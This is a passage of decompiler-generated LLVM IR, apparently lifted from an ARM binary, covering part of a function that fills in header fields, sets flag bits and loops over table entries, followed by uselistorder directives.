  %v0_b9d4 = load i32, i32* %ip.global-to-local, align 4
  %v2_b9d4 = icmp eq i32 %v0_b9d4, 0
  store i1 %v2_b9d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b9d8, i32* %r1.global-to-local, align 4
  %v0_b9dc = load i32, i32* %r2.global-to-local, align 4
  %v1_b9dc = trunc i32 %v0_b9dc to i16
  %v2_b9dc = load i32, i32* @r4, align 4
  %v3_b9dc = add i32 %v2_b9dc, 2
  %v4_b9dc = inttoptr i32 %v3_b9dc to i16*
  store i16 %v1_b9dc, i16* %v4_b9dc, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b9d4, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_b900
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_b900, %bb79
  %v0_b9e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b9e8 = trunc i32 %v0_b9e8 to i8
  %v2_b9e8 = load i32, i32* @r4, align 4
  %v3_b9e8 = add i32 %v2_b9e8, 8
  %v4_b9e8 = inttoptr i32 %v3_b9e8 to i8*
  store i8 %v1_b9e8, i8* %v4_b9e8, align 1
  %v0_b9ec = load i32, i32* %r3.global-to-local, align 4
  %v1_b9ec = trunc i32 %v0_b9ec to i8
  %v2_b9ec = load i32, i32* @r4, align 4
  %v3_b9ec = add i32 %v2_b9ec, 9
  %v4_b9ec = inttoptr i32 %v3_b9ec to i8*
  store i8 %v1_b9ec, i8* %v4_b9ec, align 1
  %v0_b9f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b9f0, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b9f0 = load i32, i32* %r2.global-to-local, align 4
  %v2_b9f0 = trunc i32 %v1_b9f0 to i16
  %v3_b9f0 = load i32, i32* @r4, align 4
  %v4_b9f0 = add i32 %v3_b9f0, 6
  %v5_b9f0 = inttoptr i32 %v4_b9f0 to i16*
  store i16 %v2_b9f0, i16* %v5_b9f0, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_23394.88 to i32), i32* %r2.global-to-local, align 4
  %v2_b9f8 = load i32, i32* @global_var_23394.88, align 4
  store i32 %v2_b9f8, i32* %r1.global-to-local, align 4
  %v1_b9fc = load i32, i32* @r4, align 4
  %v2_b9fc = add i32 %v1_b9fc, 12
  %v3_b9fc = inttoptr i32 %v2_b9fc to i32*
  store i32 %v2_b9f8, i32* %v3_b9fc, align 4
  %v3_ba00 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba00, i32* %r3.global-to-local, align 4
  store i32 %v2_b4dc, i32* %ip.global-to-local, align 4
  %v4_ba08 = mul i32 %v3_ba00, 16
  %v5_ba08 = add i32 %v4_ba08, %v2_b4dc
  %v6_ba08 = inttoptr i32 %v5_ba08 to i32*
  %v7_ba08 = load i32, i32* %v6_ba08, align 4
  store i32 %v7_ba08, i32* %r2.global-to-local, align 4
  store i32 %v5_ba08, i32* %r3.global-to-local, align 4
  %v1_ba14 = load i32, i32* @r4, align 4
  %v2_ba14 = add i32 %v1_ba14, 16
  %v3_ba14 = inttoptr i32 %v2_ba14 to i32*
  store i32 %v7_ba08, i32* %v3_ba14, align 4
  %v0_ba18 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba18 = add i32 %v0_ba18, 12
  %v2_ba18 = inttoptr i32 %v1_ba18 to i16*
  %v3_ba18 = load i16, i16* %v2_ba18, align 2
  %v4_ba18 = zext i16 %v3_ba18 to i32
  store i32 %v4_ba18, i32* %r0.global-to-local, align 4
  %v1_ba1c = add i32 %v0_ba18, 8
  %v2_ba1c = inttoptr i32 %v1_ba1c to i32*
  %v3_ba1c = load i32, i32* %v2_ba1c, align 4
  store i32 %v3_ba1c, i32* %r1.global-to-local, align 4
  %v2_ba20 = load i32, i32* @r4, align 4
  %v3_ba20 = add i32 %v2_ba20, 20
  %v4_ba20 = inttoptr i32 %v3_ba20 to i16*
  store i16 %v3_ba18, i16* %v4_ba20, align 2
  %v0_ba24 = load i32, i32* @r4, align 4
  %v1_ba24 = add i32 %v0_ba24, 20
  store i32 %v1_ba24, i32* @r8, align 4
  %v1_ba28 = add i32 %v0_ba24, 33
  %v2_ba28 = inttoptr i32 %v1_ba28 to i8*
  %v3_ba28 = load i8, i8* %v2_ba28, align 1
  %v4_ba28 = zext i8 %v3_ba28 to i32
  store i32 %v4_ba28, i32* %r2.global-to-local, align 4
  %v0_ba2c = load i32, i32* %r1.global-to-local, align 4
  %v2_ba2c = add i32 %v0_ba24, 24
  %v3_ba2c = inttoptr i32 %v2_ba2c to i32*
  store i32 %v0_ba2c, i32* %v3_ba2c, align 4
  %v0_ba30 = load i32, i32* %r2.global-to-local, align 4
  %v1_ba30 = or i32 %v0_ba30, 1
  store i32 %v1_ba30, i32* %r2.global-to-local, align 4
  %v0_ba34 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba34 = add i32 %v0_ba34, 4
  %v2_ba34 = inttoptr i32 %v1_ba34 to i32*
  %v3_ba34 = load i32, i32* %v2_ba34, align 4
  store i32 %v3_ba34, i32* %r1.global-to-local, align 4
  %v1_ba38 = add i32 %v0_ba34, 14
  %v2_ba38 = inttoptr i32 %v1_ba38 to i16*
  %v3_ba38 = load i16, i16* %v2_ba38, align 2
  %v4_ba38 = zext i16 %v3_ba38 to i32
  store i32 %v4_ba38, i32* %r3.global-to-local, align 4
  %v1_ba3c = trunc i32 %v1_ba30 to i8
  %v2_ba3c = load i32, i32* @r8, align 4
  %v3_ba3c = add i32 %v2_ba3c, 13
  %v4_ba3c = inttoptr i32 %v3_ba3c to i8*
  store i8 %v1_ba3c, i8* %v4_ba3c, align 1
  %v0_ba40 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba40 = trunc i32 %v0_ba40 to i16
  %v2_ba40 = load i32, i32* @r8, align 4
  %v3_ba40 = add i32 %v2_ba40, 2
  %v4_ba40 = inttoptr i32 %v3_ba40 to i16*
  store i16 %v1_ba40, i16* %v4_ba40, align 2
  %v0_ba44 = load i32, i32* @r8, align 4
  %v1_ba44 = add i32 %v0_ba44, 12
  %v2_ba44 = inttoptr i32 %v1_ba44 to i8*
  %v3_ba44 = load i8, i8* %v2_ba44, align 1
  %v4_ba44 = zext i8 %v3_ba44 to i32
  store i32 %v4_ba44, i32* %r3.global-to-local, align 4
  %v1_ba48 = add i32 %v0_ba44, 13
  %v2_ba48 = inttoptr i32 %v1_ba48 to i8*
  %v3_ba48 = load i8, i8* %v2_ba48, align 1
  %v4_ba48 = zext i8 %v3_ba48 to i32
  %tmp104 = urem i8 %v3_ba44, 16
  %v1_ba4c = zext i8 %tmp104 to i32
  %v1_ba50 = or i32 %v1_ba4c, 128
  store i32 %v1_ba50, i32* %r3.global-to-local, align 4
  %v1_ba54 = or i32 %v4_ba48, 16
  store i32 %v1_ba54, i32* %r2.global-to-local, align 4
  %v0_ba58 = load i32, i32* %r1.global-to-local, align 4
  %v2_ba58 = add i32 %v0_ba44, 8
  %v3_ba58 = inttoptr i32 %v2_ba58 to i32*
  store i32 %v0_ba58, i32* %v3_ba58, align 4
  %v0_ba5c = load i32, i32* %r3.global-to-local, align 4
  %v1_ba5c = trunc i32 %v0_ba5c to i8
  %v2_ba5c = load i32, i32* @r8, align 4
  %v3_ba5c = add i32 %v2_ba5c, 12
  %v4_ba5c = inttoptr i32 %v3_ba5c to i8*
  store i8 %v1_ba5c, i8* %v4_ba5c, align 1
  %v0_ba60 = load i32, i32* %r2.global-to-local, align 4
  %v1_ba60 = trunc i32 %v0_ba60 to i8
  %v2_ba60 = load i32, i32* @r8, align 4
  %v3_ba60 = add i32 %v2_ba60, 13
  %v4_ba60 = inttoptr i32 %v3_ba60 to i8*
  store i8 %v1_ba60, i8* %v4_ba60, align 1
  %v0_ba64 = call i32 @function_f700()
  %v1_ba64 = trunc i32 %v0_ba64 to i16
  store i32 %v0_ba64, i32* %r0.global-to-local, align 4
  store i32 %v1_b5a8, i32* %r1.global-to-local, align 4
  %v0_ba6c = load i32, i32* @r8, align 4
  %v1_ba6c = add i32 %v0_ba6c, 13
  %v2_ba6c = inttoptr i32 %v1_ba6c to i8*
  %v3_ba6c = load i8, i8* %v2_ba6c, align 1
  %v4_ba6c = zext i8 %v3_ba6c to i32
  store i32 %v1_ba70, i32* %r2.global-to-local, align 4
  %v1_ba74 = and i32 %v4_ba6c, 223
  %v5_ba78 = or i32 %v1_ba74, %v4_ba78
  store i32 %v5_ba78, i32* %r3.global-to-local, align 4
  %v1_ba7c = trunc i32 %v5_ba78 to i8
  store i8 %v1_ba7c, i8* %v2_ba6c, align 1
  store i32 %v1_b5c8, i32* %ip.global-to-local, align 4
  %v0_ba84 = load i32, i32* @r8, align 4
  %v1_ba84 = add i32 %v0_ba84, 13
  %v2_ba84 = inttoptr i32 %v1_ba84 to i8*
  %v3_ba84 = load i8, i8* %v2_ba84, align 1
  %v4_ba84 = zext i8 %v3_ba84 to i32
  store i32 %v1_ba88, i32* %r3.global-to-local, align 4
  %v1_ba8c = and i32 %v4_ba84, 239
  %v5_ba90 = or i32 %v1_ba8c, %v4_ba90
  store i32 %v5_ba90, i32* %r2.global-to-local, align 4
  %v1_ba94 = trunc i32 %v5_ba90 to i8
  store i8 %v1_ba94, i8* %v2_ba84, align 1
  store i32 %v1_b5e8, i32* %r1.global-to-local, align 4
  %v0_ba9c = load i32, i32* @r8, align 4
  %v1_ba9c = add i32 %v0_ba9c, 13
  %v2_ba9c = inttoptr i32 %v1_ba9c to i8*
  %v3_ba9c = load i8, i8* %v2_ba9c, align 1
  %v4_ba9c = zext i8 %v3_ba9c to i32
  store i32 %v1_baa0, i32* %r2.global-to-local, align 4
  %v1_baa4 = and i32 %v4_ba9c, 247
  %v5_baa8 = or i32 %v1_baa4, %v4_baa8
  store i32 %v5_baa8, i32* %r3.global-to-local, align 4
  %v1_baac = trunc i32 %v5_baa8 to i8
  store i8 %v1_baac, i8* %v2_ba9c, align 1
  store i32 %v1_b608, i32* %ip.global-to-local, align 4
  %v0_bab4 = load i32, i32* @r8, align 4
  %v1_bab4 = add i32 %v0_bab4, 13
  %v2_bab4 = inttoptr i32 %v1_bab4 to i8*
  %v3_bab4 = load i8, i8* %v2_bab4, align 1
  %v4_bab4 = zext i8 %v3_bab4 to i32
  store i32 %v1_bab8, i32* %r3.global-to-local, align 4
  %v1_babc = and i32 %v4_bab4, 251
  %v5_bac0 = or i32 %v1_babc, %v4_bac0
  store i32 %v5_bac0, i32* %r2.global-to-local, align 4
  %v1_bac4 = trunc i32 %v5_bac0 to i8
  store i8 %v1_bac4, i8* %v2_bab4, align 1
  store i32 %v1_b628, i32* %r1.global-to-local, align 4
  %v0_bacc = load i32, i32* @r8, align 4
  %v1_bacc = add i32 %v0_bacc, 13
  %v2_bacc = inttoptr i32 %v1_bacc to i8*
  %v3_bacc = load i8, i8* %v2_bacc, align 1
  %v4_bacc = zext i8 %v3_bacc to i32
  store i32 %v1_bad0, i32* %r2.global-to-local, align 4
  %v1_bad4 = and i32 %v4_bacc, 253
  %v4_bad8 = or i32 %v1_bad4, %v3_bad8
  store i32 %v4_bad8, i32* %r3.global-to-local, align 4
  %v1_badc = trunc i32 %v4_bad8 to i8
  store i8 %v1_badc, i8* %v2_bacc, align 1
  store i32 %v1_b648, i32* %ip.global-to-local, align 4
  %v0_bae4 = load i32, i32* @r8, align 4
  %v1_bae4 = add i32 %v0_bae4, 13
  %v2_bae4 = inttoptr i32 %v1_bae4 to i8*
  %v3_bae4 = load i8, i8* %v2_bae4, align 1
  %v4_bae4 = zext i8 %v3_bae4 to i32
  %v1_baec = and i32 %v4_bae4, 254
  store i32 %v1_baec, i32* %r2.global-to-local, align 4
  %v2_baf0 = or i32 %v1_baec, %v1_bae8
  store i32 %v2_baf0, i32* %r3.global-to-local, align 4
  %v1_baf4 = trunc i32 %v2_baf0 to i8
  store i8 %v1_baf4, i8* %v2_bae4, align 1
  %v3_baf8 = load i32, i32* @r8, align 4
  %v4_baf8 = add i32 %v3_baf8, 14
  %v5_baf8 = inttoptr i32 %v4_baf8 to i16*
  store i16 %v1_ba64, i16* %v5_baf8, align 2
  store i32 %v6_b660, i32* %r1.global-to-local, align 4
  %v0_bb00 = load i32, i32* @r4, align 4
  %v1_bb00 = add i32 %v0_bb00, 40
  store i32 %v1_bb00, i32* %r0.global-to-local, align 4
  %v2_bb04 = inttoptr i32 %v1_bb00 to i16*
  %v3_bb04 = call i32 @function_f900(i16* %v2_bb04, i32 %v6_b660)
  store i32 %v3_bb04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b858

dec_label_pc_bb0c:                                ; preds = %dec_label_pc_b6cc
  store i32 %v6_b660, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_b660, 40
  br label %dec_label_pc_bb1c

dec_label_pc_bb1c:                                ; preds = %dec_label_pc_b86c, %dec_label_pc_bb0c
  %storemerge6.pre-phi = phi i32 [ %v1_b95c, %dec_label_pc_b86c ], [ %.pre, %dec_label_pc_bb0c ]
  %v0_bb3026 = phi i32 [ %v1_b860, %dec_label_pc_b86c ], [ 0, %dec_label_pc_bb0c ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_b660, 65536
  %storemerge = add i32 %v6_b660, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_bb1c = add i32 %storemerge4, 1310720
  store i32 %v1_bb1c, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_bb1c, 256
  %v3_bb24 = and i32 %tmp83, 65280
  store i32 %v3_bb24, i32* %r3.global-to-local, align 4
  %v4_bb28 = udiv i32 %v1_bb1c, 16777216
  %v5_bb28 = or i32 %v3_bb24, %v4_bb28
  store i32 %v5_bb28, i32* @r8, align 4
  %v2_bc54 = icmp eq i32 %v1_b680, 0
  br label %dec_label_pc_bb2c

dec_label_pc_bb2c:                                ; preds = %dec_label_pc_bb2c, %dec_label_pc_bc38, %dec_label_pc_bb1c
  %v0_bb30 = phi i32 [ %v0_bb3026, %dec_label_pc_bb1c ], [ 0, %dec_label_pc_bc38 ], [ 0, %dec_label_pc_bb2c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bb30 = icmp eq i32 %v0_bb30, 0
  store i1 %v2_bb30, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bb30, label %dec_label_pc_bb2c, label %dec_label_pc_bb3c

dec_label_pc_bb3c:                                ; preds = %dec_label_pc_bb2c, %dec_label_pc_bc38
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb40

dec_label_pc_bb40:                                ; preds = %dec_label_pc_bb68, %dec_label_pc_bb3c
  %v1_bb48 = phi i32 [ %v1_bc28, %dec_label_pc_bb68 ], [ 0, %dec_label_pc_bb3c ]
  store i32 %v2_b4ec, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_bb48 = mul i32 %v1_bb48, 4
  %v5_bb48 = add i32 %v4_bb48, %v2_b4ec
  %v6_bb48 = inttoptr i32 %v5_bb48 to i32*
  %v7_bb48 = load i32, i32* %v6_bb48, align 4
  store i32 %v7_bb48, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_bb50 = load i32, i32* @fp, align 4
  %v9_bb50 = icmp eq i32 %v0_bb50, 65535
  store i1 %v9_bb50, i1* %cpsr_z.global-to-local, align 1
  %v1_bb54 = add i32 %v7_bb48, 20
  store i32 %v1_bb54, i32* @r5, align 4
  br i1 %v9_bb50, label %dec_label_pc_bc4c, label %dec_label_pc_bb5c

dec_label_pc_bb5c:                                ; preds = %dec_label_pc_bb40
  store i32 %v1_b680, i32* %r3.global-to-local, align 4
  store i1 %v2_bc54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bc54, label %dec_label_pc_bb68, label %dec_label_pc_bc60

dec_label_pc_bb68:                                ; preds = %dec_label_pc_bb5c, %dec_label_pc_bc4c, %dec_label_pc_bc60
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_bb6c = load i32, i32* @r4, align 4
  %v3_bb6c = add i32 %v2_bb6c, 10
  %v4_bb6c = inttoptr i32 %v3_bb6c to i16*
  store i16 0, i16* %v4_bb6c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bb74 = load i32, i32* @r4, align 4
  store i32 %v0_bb74, i32* @r0, align 4
  %v2_bb78 = call i32 @function_dc98(i32 %v0_bb74, i32 20)
  %v3_bb78 = trunc i32 %v2_bb78 to i16
  store i32 %v2_bb78, i32* %r0.global-to-local, align 4
  %v3_bb7c = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_b4dc, i32* %r2.global-to-local, align 4
  %v3_bb84 = mul i32 %v3_bb7c, 16
  %v2_bb88 = add i32 %v3_bb84, %v2_b4dc
  store i32 %v2_bb88, i32* %r1.global-to-local, align 4
  %v1_bb8c = add i32 %v2_bb88, 4
  %v2_bb8c = inttoptr i32 %v1_bb8c to i32*
  %v3_bb8c = load i32, i32* %v2_bb8c, align 4
  %v3_bb90 = mul i32 %v3_bb8c, 65536
  store i32 %v3_bb90, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_bb8c, 256
  %v1_bb98 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_bb8c, 256
  %v4_bb9c = urem i32 %tmp86, 256
  %v5_bb9c = or i32 %v4_bb9c, %v1_bb98
  store i32 %v5_bb9c, i32* %r3.global-to-local, align 4
  %v1_bba0 = add i32 %v3_bb8c, 1
  store i32 %v1_bba0, i32* %r2.global-to-local, align 4
  store i32 %v1_bba0, i32* %v2_bb8c, align 4
  %v0_bba8 = load i32, i32* %r3.global-to-local, align 4
  %v1_bba8 = load i32, i32* @r5, align 4
  %v2_bba8 = add i32 %v1_bba8, 4
  %v3_bba8 = inttoptr i32 %v2_bba8 to i32*
  store i32 %v0_bba8, i32* %v3_bba8, align 4
  %v0_bbac = load i32, i32* %r1.global-to-local, align 4
  %v1_bbac = add i32 %v0_bbac, 8
  %v2_bbac = inttoptr i32 %v1_bbac to i32*
  %v3_bbac = load i32, i32* %v2_bbac, align 4
  %tmp87 = mul i32 %v3_bbac, 256
  %v1_bbb8 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_bbac, 256
  %v4_bbbc = urem i32 %tmp88, 256
  %v5_bbbc = or i32 %v4_bbbc, %v1_bbb8
  %v1_bbc0 = load i32, i32* @r5, align 4
  %v2_bbc0 = add i32 %v1_bbc0, 8
  %v3_bbc0 = inttoptr i32 %v2_bbc0 to i32*
  store i32 %v5_bbbc, i32* %v3_bbc0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_bbc8 = load i32, i32* @r4, align 4
  %v4_bbc8 = add i32 %v3_bbc8, 10
  %v5_bbc8 = inttoptr i32 %v4_bbc8 to i16*
  store i16 %v3_bb78, i16* %v5_bbc8, align 2
  %v0_bbcc = load i32, i32* @r5, align 4
  store i32 %v0_bbcc, i32* @r1, align 4
  %v0_bbd0 = load i32, i32* %r3.global-to-local, align 4
  %v1_bbd0 = trunc i32 %v0_bbd0 to i16
  %v3_bbd0 = add i32 %v0_bbcc, 16
  %v4_bbd0 = inttoptr i32 %v3_bbd0 to i16*
  store i16 %v1_bbd0, i16* %v4_bbd0, align 2
  %v0_bbd4 = load i32, i32* @r8, align 4
  store i32 %v0_bbd4, i32* %r2.global-to-local, align 4
  %v0_bbd8 = load i32, i32* @sl, align 4
  store i32 %v0_bbd8, i32* %r3.global-to-local, align 4
  %v0_bbdc = load i32, i32* @r4, align 4
  store i32 %v0_bbdc, i32* %r0.global-to-local, align 4
  %v4_bbe0 = call i32 @function_dce8(i32 %v0_bbdc, i32 %v0_bbcc, i32 %v0_bbd4, i32 %v0_bbd8)
  %v5_bbe0 = trunc i32 %v4_bbe0 to i16
  store i32 %v4_bbe0, i32* %r0.global-to-local, align 4
  %v3_bbe4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bbe4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_bbec = mul i32 %v3_bbe4, 32
  store i32 %v3_bbec, i32* %lr.global-to-local, align 4
  %v3_bbf0 = load i32, i32* @r5, align 4
  %v4_bbf0 = add i32 %v3_bbf0, 16
  %v5_bbf0 = inttoptr i32 %v4_bbf0 to i16*
  store i16 %v5_bbe0, i16* %v5_bbf0, align 2
  %v0_bbf4 = load i32, i32* %lr.global-to-local, align 4
  %v1_bbf4 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_bbf4, -8
  %v5_bbf4 = add i32 %v0_bbf4, %tmp105
  store i32 %v5_bbf4, i32* %lr.global-to-local, align 4
  %v0_bbf8 = load i32, i32* @r5, align 4
  %v1_bbf8 = add i32 %v0_bbf8, 2
  %v2_bbf8 = inttoptr i32 %v1_bbf8 to i16*
  %v3_bbf8 = load i16, i16* %v2_bbf8, align 2
  %v1_bbfc = load i32, i32* %ip.global-to-local, align 4
  %v2_bbfc = add i32 %v1_bbfc, %v5_bbf4
  store i32 %v2_bbfc, i32* @lr, align 4
  %v3_bc00 = add i32 %v2_bbfc, 2
  %v4_bc00 = inttoptr i32 %v3_bc00 to i16*
  store i16 %v3_bbf8, i16* %v4_bc00, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_bc0c = load i32, i32* @r4, align 4
  store i32 %v0_bc0c, i32* %r1.global-to-local, align 4
  %v0_bc10 = load i32, i32* @sb, align 4
  store i32 %v0_bc10, i32* %r0.global-to-local, align 4
  %v0_bc14 = load i32, i32* @r7, align 4
  store i32 %v0_bc14, i32* %r2.global-to-local, align 4
  %v0_bc18 = load i32, i32* @lr, align 4
  %v6_bc20 = call i32 @function_138bc(i32 %v0_bc10, i32 %v0_bc0c, i32 %v0_bc14, i32 16384, i32 %v0_bc18, i32 16)
  %v3_bc24 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc24, i32* %r3.global-to-local, align 4
  %v1_bc28 = add i32 %v3_bc24, 1
  store i32 %v1_bc28, i32* %r0.global-to-local, align 4
  %v0_bc2c = load i32, i32* @r6, align 4
  %v9_bc2c = icmp eq i32 %v0_bc2c, %v1_bc28
  store i1 %v9_bc2c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bc28, i32* %stack_var_-44, align 4
  %v8_bc34 = icmp sgt i32 %v0_bc2c, %v1_bc28
  br i1 %v8_bc34, label %dec_label_pc_bb40, label %dec_label_pc_bc38

dec_label_pc_bc38:                                ; preds = %dec_label_pc_bb68
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bc3c = icmp eq i32 %v0_bc2c, 0
  store i1 %v2_bc3c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bc3c, label %dec_label_pc_bb2c, label %dec_label_pc_bb3c

dec_label_pc_bc4c:                                ; preds = %dec_label_pc_bb40
  %v0_bc4c = call i32 @function_f700()
  %v1_bc4c = trunc i32 %v0_bc4c to i16
  store i32 %v0_bc4c, i32* %r0.global-to-local, align 4
  store i32 %v1_b680, i32* %r3.global-to-local, align 4
  store i1 %v2_bc54, i1* %cpsr_z.global-to-local, align 1
  %v3_bc58 = load i32, i32* @r4, align 4
  %v4_bc58 = add i32 %v3_bc58, 4
  %v5_bc58 = inttoptr i32 %v4_bc58 to i16*
  store i16 %v1_bc4c, i16* %v5_bc58, align 2
  br i1 %v2_bc54, label %dec_label_pc_bb68, label %dec_label_pc_bc4c.dec_label_pc_bc60_crit_edge

dec_label_pc_bc4c.dec_label_pc_bc60_crit_edge:    ; preds = %dec_label_pc_bc4c
  %v0_bc60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bc60

dec_label_pc_bc60:                                ; preds = %dec_label_pc_bc4c.dec_label_pc_bc60_crit_edge, %dec_label_pc_bb5c
  %v0_bc60 = phi i32 [ %v0_bc60.pre, %dec_label_pc_bc4c.dec_label_pc_bc60_crit_edge ], [ %v7_bb48, %dec_label_pc_bb5c ]
  %v1_bc60 = add i32 %v0_bc60, 40
  store i32 %v1_bc60, i32* %r0.global-to-local, align 4
  store i32 %v6_b660, i32* %r1.global-to-local, align 4
  %v2_bc68 = inttoptr i32 %v1_bc60 to i16*
  %v3_bc68 = call i32 @function_f900(i16* %v2_bc68, i32 %v6_b660)
  store i32 %v3_bc68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb68

; uselistorder directives
  uselistorder i32 %v0_bc4c, { 1, 0 }
  uselistorder i32 %v1_bc28, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_bbf4, { 1, 0 }
  uselistorder i32 %v4_bbe0, { 1, 0 }
  uselistorder i32 %v3_bbac, { 1, 0 }
  uselistorder i32 %v3_bb8c, { 3, 2, 0, 1 }
  uselistorder i32 %v2_bb78, { 1, 0 }
  uselistorder i1 %v2_bc54, { 2, 3, 1, 0 }
  uselistorder i32 %v0_ba64, { 1, 0 }
  uselistorder i32 %v0_b99c, { 1, 0 }
  uselistorder i32 %v5_b930, { 1, 0 }
  uselistorder i32 %v0_b8f0, { 1, 0 }
  uselistorder i32 %v0_b8ac, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b85c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_b848, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_b7d4, { 1, 0 }
  uselistorder i32 %v6_b7cc, { 0, 2, 1, 3 }
  uselistorder i1 %v9_b7fc, { 1, 0 }
  uselistorder i32 %v4_b810, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_b758, { 1, 0, 2 }
  uselistorder i32 %v0_b908, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_b748, { 1, 0 }
  uselistorder i1 %v7_b740, { 1, 0, 2 }
  uselistorder i1 %v7_b6f4, { 1, 0 }
  uselistorder i32 %v3_b6f0, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_bad0, { 1, 0 }
  uselistorder i32 %v1_bab8, { 1, 0 }
  uselistorder i32 %v1_baa0, { 1, 0 }
  uselistorder i32 %v1_ba88, { 1, 0 }
  uselistorder i32 %v1_ba70, { 1, 0 }
  uselistorder i32 %v3_b808, { 1, 0 }
  uselistorder i1 %v2_b824, { 1, 0 }
  uselistorder i32 %v1_b820, { 1, 0 }
  uselistorder i32 %v4_b81c, { 2, 0, 1 }
  uselistorder i32 %v2_b730, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_b6cc, { 1, 0 }
  uselistorder i1 %v7_b6c4, { 1, 0 }
  uselistorder i1 %v7_b698, { 1, 0 }
  uselistorder i32 %v3_b694, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_b680, { 2, 3, 1, 0 }
  uselistorder i32 %v6_b660, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_b648, { 1, 0 }
  uselistorder i32 %v1_b628, { 1, 0 }
  uselistorder i32 %v1_b608, { 1, 0 }
  uselistorder i32 %v1_b5e8, { 1, 0 }
  uselistorder i32 %v1_b5c8, { 1, 0 }
  uselistorder i32 %v1_b5a8, { 1, 0 }
  uselistorder i32 %v6_b584, { 1, 0 }
  uselistorder i32 %v1_b56c, { 1, 0 }
  uselistorder i8 %v5_b524, { 1, 0 }
  uselistorder i32 %v6_b504, { 1, 0 }
  uselistorder i32 %v2_b4ec, { 0, 3, 1, 2 }
  uselistorder i32 %v2_b4dc, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 49, 48, 50, 52, 51, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
